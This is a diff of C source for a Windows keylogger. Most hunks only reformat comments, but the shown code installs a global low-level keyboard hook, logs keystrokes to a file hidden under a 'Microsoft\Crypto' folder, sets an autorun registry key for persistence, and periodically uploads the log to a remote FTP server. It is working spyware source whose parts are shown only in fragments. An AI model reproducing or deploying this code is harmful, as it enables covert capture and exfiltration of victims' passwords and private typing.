@@ -59,10 +59,11 @@ LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
   if (logFile == NULL)
     {
       perror ("_wfopen in LowLevelKeyboardProc");
-      exit (1);        /* Critical error: we really need to have log file */
+      /* Critical error: we really need to have log file */
+      exit (1);
     }
 
-  if (wParam == WM_KEYUP)       /* When the key has been pressed and released */
+  if (wParam == WM_KEYUP) /* When the key has been pressed and released */
     {
       HWND current_window = GetForegroundWindow ();
 
@@ -136,7 +137,7 @@ send2ftp (void *arg)
       if (WSAStartup (0x101, &ws) != NO_ERROR)
         {
           fprintf (stderr, "WSAStartup: %d\n", WSAGetLastError ());
-          continue;             /* It is not critical, try another time */
+          continue; /* It is not critical error, try another time */
         }
 
       /* Open up a socket for out tcp/ip session */
@@ -214,19 +215,20 @@ send2ftp (void *arg)
       char *token = strtok (str, ",");
 
       /* Lets break the string up using the ',' character as a separator
-       * and get the ip address from the string                         */
+       * and get the ip address from the string
+       */
 
       strcpy (szIP, "");
       strcat (szIP, token);
-      strcat (szIP, ".");               /* szIP contains "216."         */
+      strcat (szIP, ".");               /* szIP contains "216." */
 
       token = strtok (NULL, ",");
       strcat (szIP, token);
-      strcat (szIP, ".");               /* szIP contains "216.92."      */
+      strcat (szIP, ".");               /* szIP contains "216.92." */
 
       token = strtok (NULL, ",");
       strcat (szIP, token);
-      strcat (szIP, ".");               /* szIP contains "216.92.6"     */
+      strcat (szIP, ".");               /* szIP contains "216.92.6" */
 
       token = strtok (NULL, ",");
       strcat (szIP, token);             /* szIP contains "216.92.6.187" */
@@ -234,10 +236,10 @@ send2ftp (void *arg)
       /* Now lets get the port number */
 
       token = strtok (NULL, ",");
-      int port = atoi (token) * 256;    /*      194 * 256               */
+      int port = atoi (token) * 256;    /* 194 * 256 */
 
       token = strtok (NULL, ",");
-      port += atoi (token);             /*      + 13                    */
+      port += atoi (token);             /*   + 13    */
 
       /* Open up a socket for passive transfer session */
       SOCKET pasv = socket (AF_INET, SOCK_STREAM, 0);
@@ -256,7 +258,8 @@ send2ftp (void *arg)
         }
 
       /* Begins transmission of a file to the remote site.
-       * Remote file name is "MACHINE.UNIX_TIMESTAMP"                   */
+       * Remote file name is "MACHINE.UNIX_TIMESTAMP"
+       */
 
       sprintf (buf, "STOR %s.%i\r\n", MACHINE, (int) time (NULL));
       send (sock, buf, strlen (buf), 0);
@@ -271,13 +274,14 @@ send2ftp (void *arg)
           continue;
         }
 
-      /* We use "fread() != 0" instead of "!feof()" because log file 
-       * may contain more than one EOF character                        */
+      /* We use "fread() != 0" instead of "!feof()" because log file
+       * may contain more than one EOF character
+       */
       while (fread (buf, 1, sizeof (buf), logFile) != 0)
         {
           send (pasv, buf, sizeof (buf), 0);
           memset (buf, 0, sizeof (buf));
-          Sleep (1000);         /* 1 sec. delay */
+          Sleep (1000); /* 1 sec. delay */
         }
 
       fclose (logFile);
@@ -287,7 +291,7 @@ send2ftp (void *arg)
 
       WSACleanup ();
 
-    }                           /* end while */
+    } /* end while */
 }
 
 int
@@ -322,13 +326,13 @@ main (int argc, char **argv)
       if (dwRet != ERROR_SUCCESS)
         {
           fprintf (stderr, "RegQueryValueEx: %d\n", dwRet);
-          exit (1);             /* critical error: logLocation is not defined */
+          exit (1); /* critical error: logLocation is not defined */
         }
     }
   else
     {
       fprintf (stderr, "RegOpenKeyEx: %d\n", dwRet);
-      exit (1);                 /* critical error: logLocation is not defined */
+      exit (1); /* critical error: logLocation is not defined */
     }
 
   wcscat (logLocation, L"\\Microsoft\\Crypto\\");
@@ -341,7 +345,7 @@ main (int argc, char **argv)
   else
     {
       fprintf (stderr, "RegCreateKey: %d\n", dwRet);
-      exit (1);                 /* critical error: unable to set autorun key */
+      exit (1); /* critical error: unable to set autorun key */
     }
 
   RegCloseKey (hk);
@@ -349,16 +353,15 @@ main (int argc, char **argv)
   /* Create timer for ftp upload procedure */
   HANDLE timer = CreateWaitableTimer (0, 0, 0);
 
-  LARGE_INTEGER li;
-
   /* Set the event the first time 30 seconds */
+  LARGE_INTEGER li;
   li.QuadPart = -(30 * 10 * 1000 * 1000);
 
   /* After calling SetWaitableTimer set timer at `SEND_LOG_PERIOD` */
   if (! SetWaitableTimer (timer, &li, SEND_LOG_PERIOD, 0, 0, 0))
     {
       fprintf (stderr, "CreateWaitableTimer failed: %d\n", GetLastError ());
-      exit (1);                         /* Critical error */
+      exit (1); /* Critical error */
     }
 
   /* Run ftp upload in background thread.
@@ -370,25 +373,21 @@ main (int argc, char **argv)
   if (_beginthreadex (0, 0, send2ftp, (void *) timer, 0, 0) == 0)
     {
       perror ("_beginthreadex failed");
-      exit (1);                         /* Critical error */
+      exit (1); /* Critical error */
     }
 
   /* Retrieve the application instance */
   HINSTANCE instance = GetModuleHandle (NULL);
 
   /* Set a global hook to capture keystrokes */
-  HHOOK kbdhook =
-    SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);
+  SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);
 
   MSG msg;
 
-  while (1)  /* Wait forever */
+  while (1) /* Wait forever */
     while (GetMessage (&msg, NULL, 0, 0))
       DispatchMessage (&msg);
 
-  UnhookWindowsHookEx (kbdhook);
-
-  return 0;
 }
 
 /* EOF */
